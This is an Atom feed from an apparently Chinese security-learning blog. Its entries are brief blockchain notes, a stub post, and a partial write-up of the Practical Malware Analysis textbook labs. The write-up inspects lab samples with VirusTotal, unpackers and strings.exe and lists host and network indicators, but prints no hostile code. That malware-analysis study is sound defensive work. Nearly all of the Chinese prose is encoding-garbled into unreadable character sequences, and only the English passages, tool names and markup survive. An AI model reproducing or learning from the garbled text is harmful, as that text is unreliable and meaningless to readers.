<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://yearsnew.github.io</id>
    <title>NewYear&apos;s Blog</title>
    <updated>2022-11-09T16:01:07.278Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://yearsnew.github.io"/>
    <link rel="self" href="https://yearsnew.github.io/atom.xml"/>
    <subtitle>å²å²å¹´å¹´</subtitle>
    <logo>https://yearsnew.github.io/images/avatar.png</logo>
    <icon>https://yearsnew.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, NewYear&apos;s Blog</rights>
    <entry>
        <title type="html"><![CDATA[åŒºå—é“¾å­¦ä¹ ç¬”è®°]]></title>
        <id>https://yearsnew.github.io/post/qu-kuai-lian-xue-xi-bi-ji/</id>
        <link href="https://yearsnew.github.io/post/qu-kuai-lian-xue-xi-bi-ji/">
        </link>
        <updated>2022-11-09T14:55:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="åŒºå—é“¾åŸºç¡€çŸ¥è¯†">åŒºå—é“¾åŸºç¡€çŸ¥è¯†</h2>
<h3 id="0x01-æ¯”ç‰¹å¸çš„è¯ç”Ÿ">0x01 æ¯”ç‰¹å¸çš„è¯ç”Ÿ</h3>
<p>èµ·æºï¼š2008å¹´ æ¬¡è´·å±æœº â€”â€”&gt; 2008å¹´10æœˆ31æ—¥ <code>ä¸­æœ¬èªã€Šæ¯”ç‰¹å¸ï¼šä¸€ç§ç‚¹å¯¹ç‚¹çš„ç”µå­ç°é‡‘ç³»ç»Ÿã€‹</code> ï¼ˆæ ‡å¿—ç€ç¬¬ä¸€ä¸ªåŒºå—é“¾åº”ç”¨è¯ç”Ÿï¼‰<br>
<code>2016å¹´ åŒºå—é“¾å…ƒå¹´</code><br>
é‡è¦äº‹ä»¶ï¼š2009å¹´1æœˆ3æ—¥ ï¼ˆèµ«å°”è¾›åŸºï¼‰åˆ›ä¸–åŒºå— genesis block (block #0ï¼Œ&quot;0å·åŒºå—&quot;)ï¼Œé¦–æ‰¹50ä¸ªæ¯”ç‰¹å¸è¢«æŒ–å‡º<br>
â€ƒ â€ƒ â€ƒâ€ƒ 2012å¹´11æœˆ28æ—¥ æ¯”ç‰¹å¸äº¤æ˜“é¦–æ¬¡å‡åŠï¼ˆåŒºå—#210000ï¼‰<br>
â€ƒ â€ƒ â€ƒâ€ƒ 2014å¹´1æœˆ23æ—¥ ä»¥å¤ªåŠç™½çš®ä¹¦ã€Šä»¥å¤ªåŠï¼šä¸‹ä¸€ä»£æ™ºèƒ½åˆçº¦å’ŒåŒºä¸­å¿ƒåŒ–åº”ç”¨å¹³å°ã€‹<br>
â€ƒ â€ƒ â€ƒâ€ƒ 2015å¹´7æœˆ30æ—¥ ä»¥å¤ªåŠç½‘ç»œæ­£å¼è¯ç”Ÿ<br>
â€ƒ â€ƒ â€ƒâ€ƒ 2016å¹´7æœˆ21æ—¥ ä»¥å¤ªåŠç¡¬åˆ†å‰ï¼ˆè¶…è¿‡85%ç®—åŠ›ï¼‰ï¼šETH ä»¥å¤ªåŠï¼ŒETC ä»¥å¤ªåŠç»å…¸<br>
â€ƒ â€ƒ â€ƒâ€ƒ 2017å¹´8æœˆ1æ—¥ æ¯”ç‰¹å¸ç¡¬åˆ†å‰ï¼šBCH è¯ç”Ÿ<br>
â€ƒ â€ƒ â€ƒâ€ƒ 2019å¹´1æœˆ16æ—¥ ä»¥å¤ªåŠå›å£«å¦ä¸å ¡ç¡¬åˆ†å‰<br>
â€ƒ â€ƒ â€ƒâ€ƒ 2022å¹´9æœˆ15æ—¥ ä»¥å¤ªåŠ åˆå¹¶</p>
<p>æŠ€æœ¯æ”¯æŒï¼š<br>
<code>å…±è¯†æœºåˆ¶</code>ï¼š1982å¹´ Leslie Lamport æå‡ºæ‹œå åº­å°†å†›é—®é¢˜ Byzantine Generate Problem<br>
<code>åŠ å¯†æŠ€æœ¯</code>ï¼š1985å¹´ é¦–æ¬¡è®²æ¤­åœ†æ›²çº¿ç”¨äºå¯†ç å­¦<br>
â€ƒ â€ƒ â€ƒâ€ƒâ€‚ 1997å¹´ Adam Back å‘æ˜ Hashcash æŠ€æœ¯ â€”â€”&gt; POWæœºåˆ¶<br>
<code>åˆ†å¸ƒå¼æŠ€æœ¯</code>ï¼š1998å¹´ åˆ†å¸ƒå¼ç”µå­ç°é‡‘ç³»ç»ŸB-money (å¼•å…¥äº†POWæœºåˆ¶ï¼Œç‚¹å¯¹ç‚¹äº¤æ˜“å’Œä¸å¯ç¯¡æ”¹ç‰¹æ€§ï¼Œä½†æœªé‡‡ç”¨Hashcashç®—æ³•)</p>
<p>1.0æ—¶ä»£ ï¼šè”ç›Ÿé“¾R3<br>
é—¨ç½—å¸Moneroï¼š</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[how2heap]]></title>
        <id>https://yearsnew.github.io/post/how2heap/</id>
        <link href="https://yearsnew.github.io/post/how2heap/">
        </link>
        <updated>2022-10-25T16:02:54.000Z</updated>
        <content type="html"><![CDATA[<p><code>å¼€å‘ä¹‹ç¯‡</code><br>
æœ‰äººè¯´ï¼Œåº•å±‚çš„ã€ç³»ç»Ÿçš„bugå·²ç»æœ‰985çš„å­¦ç”Ÿç ”ç©¶äº†ï¼Œè®©æˆ‘å»å­¦web......ã€‹æˆ‘è‡ªè®¤ä¸ºæˆ‘å¾ˆä¸æœæ°” ï¼‰æ‰€ä»¥ï¼Œé—®ï¼šhow2heap ?ğŸ‘‹</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[PracticalMalwareAnalysis-Labs]]></title>
        <id>https://yearsnew.github.io/post/e-yi-dai-ma-shi-jian/</id>
        <link href="https://yearsnew.github.io/post/e-yi-dai-ma-shi-jian/">
        </link>
        <updated>2022-09-21T06:37:12.000Z</updated>
        <content type="html"><![CDATA[<p>ğŸ‘»ä¸€æœ¬å¥½ä¹¦çš„å¼€å§‹â€”â€”</p>
<ul>
<li>å®éªŒé¢„å¤‡ï¼š<br>
0x01 å®‰è£… winXP è™šæ‹Ÿæœº<br>
<a href="https://www.52pojie.cn/thread-661779-1-1.html"><font color=YellowGreen>ç ´è§£ä¸“ç”¨è™šæ‹Ÿæœº2.0(è‡´æ•¬å¤§ä½¬)</font></a><br>
0x02 ä¸‹è½½å®éªŒæ–‡ä»¶<br>
<a href="https://github.com/mikesiko/PracticalMalwareAnalysis-Labs"><font color=YellowGreen>ä¹¦ç›®åœ°å€ç¯å¢ƒ</font></a><br>
ğŸ™‡â€åŸä¹¦ï¼ŒåŠå…¶ç¿»è¯‘å›¢é˜Ÿï¼›ğŸ™‡â€<a href="https://github.com/Vxer-Lee/MalwareAnalysis"><font color=YellowGreen>â€Leeå¤§ä½¬çš„æ–‡ç« å’Œç›¸å…³å·¥å…·</font></a></li>
</ul>
<h2 id="chapter_1l-é™æ€åˆ†ææŠ€æœ¯åŸºç¡€"><strong>Chapter_1L</strong> é™æ€åˆ†ææŠ€æœ¯åŸºç¡€</h2>
<h3 id="lab01-01"><strong>Lab01-01</strong></h3>
<blockquote>
<ul>
<li>é—®é¢˜ï¼š<br>
1ã€å°†æ–‡ä»¶ä¸Šä¼ åˆ°http://www.VirusTotal.com è¿›è¡Œåˆ†æå¹¶æŸ¥çœ‹æŠ¥å‘Šã€‚æ–‡ä»¶åŒ¹é…åˆ°äº†å·²æœ‰çš„åç—…æ¯’è½¯ä»¶ç‰¹å¾å—ï¼Ÿ<br>
2ã€è¿™äº›æ–‡ä»¶æ˜¯ä»€ä¹ˆæ—¶å€™ç¼–è¯‘çš„ï¼Ÿ<br>
3ã€è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸­æ˜¯å¦å­˜åœ¨è¿¹è±¡è¯´æ˜ä»–ä»¬æ˜¯å¦è¢«åŠ å£³æˆ–æ··æ·†äº†ï¼Ÿå¦‚æœæ˜¯ï¼Œè¿™äº›è¿¹è±¡åœ¨å“ªé‡Œï¼Ÿ<br>
4ã€æ˜¯å¦æœ‰å¯¼å…¥å‡½æ•°æ˜¾ç¤ºå‡ºäº†è¿™ä¸ªæ¶æ„ä»£ç æ˜¯åšä»€ä¹ˆçš„ï¼Ÿå¦‚æœæ˜¯ï¼Œæ˜¯å“ªäº›å¯¼å…¥å‡½æ•°ï¼Ÿ<br>
5ã€æ˜¯å¦æœ‰ä»»ä½•å…¶ä»–æ–‡ä»¶æˆ–åŸºäºä¸»æœºçš„è¿¹è±¡ï¼Œè®©ä½ å¯ä»¥åœ¨å—æ„ŸæŸ“ç³»ç»Ÿä¸ŠæŸ¥æ‰¾ï¼Ÿ<br>
6ã€æ˜¯å¦æœ‰åŸºäºç½‘ç»œçš„è¿¹è±¡ï¼Œå¯ä»¥ç”¨æ¥å‘ç°å—æ„ŸæŸ“æœºå™¨ä¸Šçš„è¿™ä¸ªæ¶æ„ä»£ç ï¼Ÿ<br>
7ã€ä½ çŒœè¿™äº›æ–‡ä»¶çš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿ</li>
</ul>
</blockquote>
<p><strong>0x001</strong> ä¸Šä¼ è‡³  http://www.VirusTotal.comã€å›½å¤–ã€‘  æˆ–è€…  https://www.virscan.org/  ã€å›½å†…ã€‘<br>
<img src="https://yearsnew.github.io/post-images/1663816253489.png" alt="" loading="lazy"><br>
è¢«å¤§ä½¬ä»¬ç©å¤šäº†ï¼Œä¸€ç¯‡çº¢å“ˆå“ˆå“ˆï¼Œè¯šå¦‚ä¹¦åæ ‡ç­”æ‰€é¢„è§ğŸ˜<br>
<img src="https://yearsnew.github.io/post-images/1663816363240.png" alt="" loading="lazy"></p>
<p><strong>0x002</strong> ä½¿ç”¨ StudyPE+ x86 æŸ¥çœ‹æ–‡ä»¶ç¼–è¯‘æ—¶é—´<br>
<img src="https://yearsnew.github.io/post-images/1663817804845.png" alt="" loading="lazy"></p>
<p><strong>0x003</strong> ä½¿ç”¨ Exeinfo PE æŸ¥å£³ï¼ˆä¹Ÿå¯ç»§ç»­ç”¨StudyPE +86)<br>
ç»“æœä¸º not packed<br>
<img src="https://yearsnew.github.io/post-images/1663820129776.png" alt="" loading="lazy"></p>
<p><strong>0x004</strong> æŸ¥çœ‹å¯¼å…¥ä¸­å¼•ç”¨çš„åŠ¨æ€åº“ï¼Œä»¥åŠAPIå‡½æ•°</p>
<ol>
<li>The interesting imports from Lab01-01.exe are <em><strong>FindFirstFile</strong></em> , <em><strong>FindNextFile</strong></em>, and <em><strong>CopyFile</strong></em>. These imports tell us that the program searches the file system and copies files.</li>
<li>The most interesting imports from <strong>Lab01-01.dll</strong> are <em><strong>CreateProcess</strong></em> and <em><strong>Sleep</strong></em>.</li>
<li>We also see that this file imports functions from <strong>WS2_32.dll</strong>, which provides network functionality.<br>
<img src="https://yearsnew.github.io/post-images/1663821006956.png" alt="" loading="lazy"><br>
<img src="https://yearsnew.github.io/post-images/1663821816257.png" alt="" loading="lazy"></li>
</ol>
<p><strong>0x005</strong> ç”¨ Strings.exe æŸ¥çœ‹æ•æ„Ÿå­—ç¬¦</p>
<ol>
<li>å®‰è£…Strings</li>
<li>åˆ†æexe</li>
</ol>
<pre><code>strings.exe Lab01-01.exe
</code></pre>
<p><img src="https://yearsnew.github.io/post-images/1663825093108.png" alt="" loading="lazy"><br>
è”ç³»å‰é¢<em>CopyFileAå‡½æ•°</em> ï¼Œç›²çŒœè¿™ä¸ªexeç¨‹åºï¼Œæ˜¯æƒ³æŠŠLab01-01.dllæ–‡ä»¶æ‹·è´åˆ°ç³»ç»Ÿç›®å½•ï¼Œå¹¶ä¸”ä¼ªè£…æˆç³»ç»Ÿæ–‡ä»¶&quot;kernel32.dll&quot;ï¼ˆå‡åå«&quot;kerne132.dll&quot;)ã€‚<br>
This file can be used as  a host indicator to search for the malware.<br>
3. åˆ†ædll</p>
<pre><code>strings.exe Lab01-01.dll
</code></pre>
<p><img src="https://yearsnew.github.io/post-images/1663826100182.png" alt="" loading="lazy"><br>
å‘ç°ä¸€ä¸ªå¯ç–‘IPåœ°å€ï¼Œè”ç³»å‰é¢<em>WS2_32.dllåŠ¨æ€åº“</em>ï¼Œå¯èƒ½æ˜¯é»‘å®¢çš„IPï¼Œå¹¶é€šè¿‡å‰è¿°åŠ¨æ€åº“æ›¿æ¢åŠ ä»¥ç»´æŒåé—¨ã€‚</p>
<h3 id="lab01-02"><strong>Lab01-02</strong></h3>
<blockquote>
<ul>
<li>é—®é¢˜ï¼š<br>
1ã€å°†æ–‡ä»¶Lab01-02.exeä¸Šä¼ åˆ° http://www.VirusTotal.com/ è¿›è¡Œåˆ†æå¹¶æŸ¥çœ‹æŠ¥å‘Šã€‚æ–‡ä»¶åŒ¹é…åˆ°äº†å·²æœ‰çš„åç—…æ¯’è½¯ä»¶ç‰¹å¾å—ï¼Ÿ<br>
2ã€æ˜¯å¦æœ‰è¿™ä¸ªæ–‡ä»¶è¢«åŠ å£³æˆ–æ··æ·†çš„ä»»ä½•è¿¹è±¡ï¼Ÿå¦‚æœæ˜¯è¿™æ ·ï¼Œè¿™äº›è¿¹è±¡æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœè¯¥æ–‡ä»¶è¢«åŠ å£³ï¼Œè¯·è¿›è¡Œè„±å£³ï¼Œå¦‚æœå¯èƒ½çš„è¯ã€‚<br>
3ã€æœ‰æ²¡æœ‰ä»»ä½•å¯¼å…¥å‡½æ•°èƒ½å¤Ÿæš—ç¤ºå‡ºè¿™ä¸ªç¨‹åºçš„åŠŸèƒ½ï¼Ÿå¦‚æœæ˜¯ï¼Œæ˜¯å“ªäº›å¯¼å…¥å‡½æ•°ï¼Œå®ƒä»¬ä¼šå‘Šè¯‰ä½ ä»€ä¹ˆï¼Ÿ<br>
4ã€å“ªäº›åŸºäºä¸»æœºæˆ–åŸºäºç½‘ç»œçš„è¿¹è±¡å¯ä»¥è¢«ç”¨æ¥ç¡®å®šè¿™ä¸ªæ¶æ„ä»£ç æ„ŸæŸ“çš„æœºå™¨ï¼Ÿ</li>
</ul>
</blockquote>
<p><strong>0x001</strong> ä¸Šä¼ è‡³  http://www.VirusTotal.com<br>
<img src="https://yearsnew.github.io/post-images/1663826793584.png" alt="" loading="lazy"><br>
ä¾æ—§ä¸€ç‰‡çº¢ğŸ˜‹æ ‡ç­”å·²ç»éš¾ä»¥å‚è€ƒäº†<br>
One antivirus engine identifies it as a malicious downloader that downloads additional malware; the other two identify it as packed malware.<br>
<img src="https://yearsnew.github.io/post-images/1663826906929.png" alt="" loading="lazy"></p>
<p><strong>0x002</strong>  ä½¿ç”¨ Exeinfo PE æŸ¥å£³<br>
<img src="https://yearsnew.github.io/post-images/1663827194332.png" alt="" loading="lazy"><br>
å¾—åˆ°upxå£³</p>
<p><strong>0x003</strong> è„±å£³ä½¿ç”¨Free UPX 1.7<br>
<img src="https://yearsnew.github.io/post-images/1663832844429.png" alt="" loading="lazy"><br>
å‘ç°è¿™ä¸ªçœ‹UPXå£³ï¼Œæ›´è¯¦ç»†ï¼Œè„±å£³åï¼š<br>
<img src="https://yearsnew.github.io/post-images/1663833108656.png" alt="" loading="lazy"></p>
<p><strong>0x004</strong> ä½¿ç”¨StudyPE+ x86 æŸ¥çœ‹å¼•ç”¨åŠ¨æ€åº“ï¼Œä»¥åŠAPIå‡½æ•°<br>
The most interesting imports are <em><strong>CreateService</strong></em>, <em><strong>InternetOpen</strong></em>, and <em><strong>InternetOpenURL</strong></em><br>
<img src="https://yearsnew.github.io/post-images/1663833820943.png" alt="" loading="lazy"></p>
<p><strong>0x005</strong> ç”¨Strings.exe åˆ†æç»“æœ<br>
<img src="https://yearsnew.github.io/post-images/1663834665904.png" alt="" loading="lazy"><br>
æ ¹æ® MalService ï¼Œè”æƒ³å‰é¢åˆ›å»ºè¿›ç¨‹çš„å‡½æ•°ï¼Œåˆ¤æ–­ä¸ºæ¶æ„æœåŠ¡çš„åå­—ï¼›<br>
åé¢ http://** çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªURLï¼Œä½†ä¸çŸ¥é“ä¸ºä»€ä¹ˆstrings æ£€æµ‹è¿™ä¹ˆå¥‡æ€ªï¼Œåº”è¯¥ä¸ºhttp://www.malwareanalysisbook.com/</p>
<h3 id="lab01-03"><strong>Lab01-03</strong></h3>
<blockquote>
<ul>
<li>é—®é¢˜ï¼š<br>
1ã€å°†æ–‡ä»¶ Lab01-03.exe ä¸Šä¼ åˆ°http://www.VirusTotal.com è¿›è¡Œåˆ†æå¹¶æŸ¥çœ‹æŠ¥å‘Šã€‚æ–‡ä»¶åŒ¹é…åˆ°äº†å·²æœ‰çš„åç—…æ¯’è½¯ä»¶ç‰¹å¾å—ï¼Ÿ<br>
2ã€æ˜¯å¦æœ‰è¿™ä¸ªæ–‡ä»¶è¢«åŠ å£³æˆ–æ··æ·†çš„ä»»ä½•è¿¹è±¡ï¼Ÿå¦‚æœæ˜¯è¿™æ ·ï¼Œè¿™äº›è¿¹è±¡æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœè¯¥æ–‡ä»¶è¢«åŠ å£³ï¼Œè¯·è¿›è¡Œè„±å£³ï¼Œå¦‚æœå¯èƒ½çš„è¯ã€‚<br>
3ã€æœ‰æ²¡æœ‰ä»»ä½•å¯¼å…¥å‡½æ•°èƒ½å¤Ÿæš—ç¤ºå‡ºè¿™ä¸ªç¨‹åºçš„åŠŸèƒ½ï¼Ÿå¦‚æœæ˜¯ï¼Œæ˜¯å“ªäº›å¯¼å…¥å‡½æ•°ï¼Œä»–ä»¬ä¼šå‘Šè¯‰ä½ ä»€ä¹ˆï¼Ÿ<br>
4ã€å“ªäº›åŸºäºä¸»æœºæˆ–åŸºäºç½‘ç»œçš„è¿¹è±¡å¯ä»¥è¢«ç”¨æ¥ç¡®å®šè¿™ä¸ªæ¶æ„ä»£ç æ„ŸæŸ“çš„æœºå™¨ï¼Ÿ</li>
</ul>
</blockquote>
<p><strong>0x001</strong> ä¸Šä¼ è‡³  http://www.VirusTotal.com<br>
è¿™ã€‚ã€‚ã€‚éƒ½å¿«çº¢æ»¡äº†ï¼<br>
<img src="https://yearsnew.github.io/post-images/1663835587353.png" alt="" loading="lazy"></p>
<p><strong>0x002</strong> ä½¿ç”¨ Exeinfo PE æŸ¥å£³å¾—æœªçŸ¥å£³ï¼Œç”¨StudyPE +86å·®çš„FSGå£³<br>
<img src="https://yearsnew.github.io/post-images/1663842933151.png" alt="" loading="lazy"></p>
<p><strong>0x003</strong> çœ‹æ ‡ç­”ï¼Œå¥½å¥½ç¬‘å“ˆå“ˆå“ˆå“ˆ<br>
<img src="https://yearsnew.github.io/post-images/1663842053122.png" alt="" loading="lazy"><br>
å’±åº”è¯¥æš‚æ—¶è§£ç­”ä¸å‡ºæ¥å“ˆï¼Œé—®é¢˜å› æ­¤ä¹Ÿä¸èƒ½å›ç­”å‘¢</p>
<p><strong>0x004</strong> ä½¿ç”¨ linxerUnpacker è¿›è¡Œè„±å£³ï¼Œçœ‹åˆ°äº†ä½œè€…çš„å¼€å‘æ—¥è®°ï¼ˆè†œæ‹œğŸ˜¼ï¼‰<br>
<img src="https://yearsnew.github.io/post-images/1663844590027.png" alt="" loading="lazy"><br>
çªç„¶å‘ç°ï¼Œè¿™ä¸ªç¨‹åºå’ŒMFCæœ‰ç‚¹åƒï¼Ÿï¼Ÿï¼Ÿ</p>
<p><strong>0x005</strong> åˆ†æå¼•ç”¨åŠ¨æ€åº“ï¼Œä»¥åŠAPIå‡½æ•°<br>
<img src="https://yearsnew.github.io/post-images/1663843569241.png" alt="" loading="lazy"><br>
çœ‹åˆ°ä¸€ä¸ªæœ‰ç‚¹çœ¼ç†Ÿçš„å‡½æ•°ï¼Œç›´è§‰ä¸å¯¹ï¼ŒæŸ¥ä¹‹å‰ä¿å­˜çš„æ–‡æ¡£ï¼š<br>
â— OleInitialize<br>
ç”¨æ¥åˆå§‹åŒ–COMåº“ã€‚ä½¿ç”¨COMå¯¹è±¡çš„ç¨‹åºå¿…é¡»åœ¨è°ƒç”¨ä»»ä½•å…¶ä»–COMåŠŸèƒ½ä¹‹å‰ï¼Œè°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚<br>
<s>å…·ä½“å¨èƒæŒ–å‘</s><br>
æ¥è¡¥å‘å•¦ã€é‡‡ç”¨ä¸‹ä¸€ç« åŠ¨æ€è°ƒè¯•ã€‘<br>
ä½¿ç”¨apaterDNS å’Œ kali è‡ªå¸¦çš„<br>
ç—…æ¯’è¿è¡Œç»“æœï¼š<br>
<img src="https://yearsnew.github.io/post-images/1664605272486.png" alt="" loading="lazy"><br>
ä¸€äº›æä¸ºä¸æ­£å¸¸çš„dns:<br>
<img src="https://yearsnew.github.io/post-images/1664606969853.png" alt="" loading="lazy"></p>
<h3 id="lab01-04"><strong>Lab01-04</strong></h3>
<blockquote>
<ul>
<li>é—®é¢˜ï¼š<br>
1ã€å°†æ–‡ä»¶ Lab01-04.exe ä¸Šä¼ åˆ° http://www.VirusTotal.com è¿›è¡Œåˆ†æå¹¶æŸ¥çœ‹æŠ¥å‘Šã€‚æ–‡ä»¶åŒ¹é…åˆ°äº†å·²æœ‰çš„åç—…æ¯’è½¯ä»¶ç‰¹å¾å—ï¼Ÿ<br>
2ã€æ˜¯å¦æœ‰è¿™ä¸ªæ–‡ä»¶è¢«åŠ å£³æˆ–æ··æ·†çš„ä»»ä½•è¿¹è±¡ï¼Ÿå¦‚æœæ˜¯è¿™æ ·ï¼Œè¿™äº›è¿¹è±¡æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœè¯¥æ–‡ä»¶è¢«åŠ å£³ï¼Œè¯·è¿›è¡Œè„±å£³ï¼Œå¦‚æœå¯èƒ½çš„è¯ã€‚<br>
3ã€è¿™ä¸ªæ–‡ä»¶æ˜¯ä»€ä¹ˆæ—¶å€™è¢«ç¼–è¯‘çš„ï¼Ÿ<br>
4ã€æœ‰æ²¡æœ‰ä»»ä½•å¯¼å…¥å‡½æ•°èƒ½å¤Ÿæš—ç¤ºå‡ºè¿™ä¸ªç¨‹åºçš„åŠŸèƒ½ï¼Ÿå¦‚æœæ˜¯ï¼Œæ˜¯å“ªäº›å¯¼å…¥å‡½æ•°ï¼Œä»–ä»¬ä¼šå‘Šè¯‰ä½ ä»€ä¹ˆï¼Ÿ<br>
5ã€å“ªäº›åŸºäºä¸»æœºæˆ–åŸºäºç½‘ç»œçš„è¿¹è±¡ï¼Œå¯ä»¥è¢«ç”¨æ¥ç¡®å®šè¿™ä¸ªæ¶æ„ä»£ç æ„ŸæŸ“çš„æœºå™¨ï¼Ÿ<br>
6ã€è¿™ä¸ªæ–‡ä»¶åœ¨èµ„æºæ®µä¸­åŒ…å«ä¸€ä¸ªèµ„æºã€‚ä½¿ç”¨ Resource Hacker å·¥å…·æ¥æ£€æŸ¥èµ„æºï¼Œç„¶åæŠ½å–èµ„æºã€‚ä»èµ„æºä¸­ä½ èƒ½å‘ç°ä»€ä¹ˆå—ï¼Ÿ(Restorator)</li>
</ul>
</blockquote>
<p><strong>0x001</strong> ä¸Šä¼ è‡³  http://www.VirusTotal.com<br>
<img src="https://yearsnew.github.io/post-images/1663844708510.png" alt="" loading="lazy"></p>
<p><strong>0x002</strong> åˆ†æï¼Œæ˜æ˜¾æ„Ÿè§‰åˆ°æ¯”ä¹‹å‰çš„å¤æ‚ï¼Œä½†ä¸å¾—ä¸è¯´ Strings.exe çœŸçš„éå¸¸å¼ºå¤§ï¼å…¶å®å•å•ä»</p>
<pre><code>strings.exe Lab01-04.exe
</code></pre>
<p>å°±å¯ä»¥çœ‹å‡ºå¾ˆå¤šä¸œè¥¿ï¼Œæ¯”å¦‚ï¼š</p>
<ol>
<li>!This program cannot be run in DOS mode.</li>
<li>è¿™ä¸€ç³»åˆ—ï¼š<br>
<img src="https://yearsnew.github.io/post-images/1663849191029.png" alt="" loading="lazy"></li>
<li>ç”šè‡³æ˜¯éœ€è¦åˆ†ç¦»æ‰èƒ½åœ¨å¯¼å…¥å¼•ç”¨åŠ¨æ€åº“é‡Œçœ‹åˆ°çš„ï¼š<br>
<img src="https://yearsnew.github.io/post-images/1663849237661.png" alt="" loading="lazy"></li>
<li>æ›´é‡è¦çš„æ˜¯ï¼ï¼š<br>
<img src="https://yearsnew.github.io/post-images/1663849325110.png" alt="" loading="lazy"><br>
The string <em><strong>\system32\wupdmgr.exe</strong></em> indicates that this program could create or modify a file at that location. The string <em>www.malwareanalysisbook.com/updater.exe</em> probably indicates where additional malware is stored, ready for download.<br>
åŸºäºä»¥ä¸Šï¼Œæˆ‘ä»¬å¤§èƒ†åœ°å±•å¼€åˆç†åœ°æ¨æµ‹ï¼ŒåŸºæœ¬ä¹Ÿèƒ½çœ‹å‡º malware çš„ç›®çš„ã€‚</li>
</ol>
<p><strong>0x003</strong> æŸ¥å£³æ— å£³ï¼Œç¼–è¯‘æ—¶é—´ä¸ºå‡ï¼ˆæœ¬ä¹¦å¾ˆæ—©ï¼Œä¼°æµ‹æœ‰ä¸Šåå¹´ï¼‰<br>
<img src="https://yearsnew.github.io/post-images/1663853716806.png" alt="" loading="lazy"></p>
<p><strong>0x004</strong> <a href="https://www.freebuf.com/articles/network/265889.html"><font color=YellowGreen>PEæ–‡ä»¶ç»“æ„å…¥é—¨åˆ°å…¥åŸ</font></a></p>
<p><strong>0x005</strong> ä½¿ç”¨StudyPE+ x86 æŸ¥çœ‹å¼•ç”¨åŠ¨æ€åº“ï¼Œä»¥åŠAPIå‡½æ•°<br>
The imports from <em><strong>advapi32.dll</strong></em> indicate that the program is doing something with permissions.<br>
<img src="https://yearsnew.github.io/post-images/1663865996699.png" alt="" loading="lazy"><br>
The imports from kernel32.dll tell us that the program loads data from the resource section (<em><strong>LoadResource</strong></em>, <em><strong>FindResource</strong></em>, and <em><strong>SizeOfResource</strong></em>), writes a file to disk (<em><strong>CreateFile</strong></em> and <em><strong>WriteFile</strong></em>), and executes a file on the disk (<em><strong>WinExec</strong></em>). We can also guess that the program writes files to the system directory because of the calls to <em><strong>GetWindowsDirectory</strong></em>.<br>
<img src="https://yearsnew.github.io/post-images/1663863966715.png" alt="" loading="lazy"></p>
<p><strong>0x006</strong> ç”¨èµ„æºç®¡ç†å™¨ï¼ˆRestoratorå·¥å…·ï¼‰æŸ¥çœ‹<br>
é€šè¿‡ PE æ–‡ä»¶çš„ç‰¹å¾ï¼Œï¼ˆPEæŒ‡çº¹ï¼‰å‰ä¸¤å­—èŠ‚asciiæ˜¯MZ, 3Cä½ç½®çš„åå…­è¿›åˆ¶å¯¹ä½ä½ç½®asciiæ˜¯ PEã€‚åˆ¤æ–­BINä¸­çš„101æ–‡ä»¶ä¸ºPEæ–‡ä»¶ï¼Œæå–ã€‚<br>
<img src="https://yearsnew.github.io/post-images/1663864856887.png" alt="" loading="lazy"></p>
<p><strong>0x007</strong> æå–ä¸º inside.exe ç»§ç»­ç”¨StudyPE+ x86 æŸ¥çœ‹å¼•ç”¨åŠ¨æ€åº“ï¼Œä»¥åŠAPIå‡½æ•°<br>
It calls <em><strong>URLDownloadToFile</strong></em>, a function commonly used by malicious downloaders.<br>
<img src="https://yearsnew.github.io/post-images/1663865075242.png" alt="" loading="lazy"><br>
It also calls <em><strong>WinExec</strong></em>, which probably executes the downloaded file.<br>
<img src="https://yearsnew.github.io/post-images/1663865539239.png" alt="" loading="lazy"><br>
The executable in the resource section is a downloader program that downloads additional malware.</p>
<h2 id="chapter_3l-åŠ¨æ€åˆ†ææŠ€æœ¯åŸºç¡€"><strong>Chapter_3L</strong> åŠ¨æ€åˆ†ææŠ€æœ¯åŸºç¡€</h2>
<h3 id="lab03-01"><strong>Lab03-01</strong></h3>
<blockquote>
<ul>
<li>é—®é¢˜ï¼š<br>
1ã€æ‰¾å‡ºè¿™ä¸ªæ¶æ„ä»£ç çš„å¯¼å…¥å‡½æ•°ä¸å­—ç¬¦ä¸²åˆ—è¡¨ï¼Ÿ<br>
2ã€è¿™ä¸ªæ¶æ„ä»£ç åœ¨ä¸»æœºä¸Šçš„æ„ŸæŸ“è¿¹è±¡ç‰¹å¾æ˜¯ä»€ä¹ˆï¼Ÿ<br>
3ã€è¿™ä¸ªæ¶æ„ä»£ç æ˜¯å¦å­˜åœ¨ä¸€äº›æœ‰ç”¨çš„ç½‘ç»œç‰¹å¾ç ï¼Ÿå¦‚æœå­˜åœ¨ï¼Œä»–ä»¬æ˜¯ä»€ä¹ˆï¼Ÿ</li>
</ul>
</blockquote>
<p>0x01 ä½¿ç”¨ StudyPE+ x86 æŸ¥çœ‹å¼•ç”¨åŠ¨æ€åº“ï¼Œå‘ç°ä»…ä»…æœ‰ä¸€ä¸ª ExitProcess å‡½æ•°ï¼Œæ€€ç–‘åŠ å£³ï¼Œç”¨PEiDæŸ¥å£³ï¼Œæœç„¶ï¼Œå†ç”¨å·¥å…·è„±å£³æœªæœ<br>
<img src="https://yearsnew.github.io/post-images/1664558835708.png" alt="" loading="lazy"><br>
0x02 ä½¿ç”¨ <code>strings.exe </code> æŸ¥çœ‹æ–‡ä»¶<br>
<img src="https://yearsnew.github.io/post-images/1664557650521.png" alt="" loading="lazy"><br>
<s>æ¯”è¾ƒå¯ç–‘çš„å­—ç¬¦ä¸²</s><br>
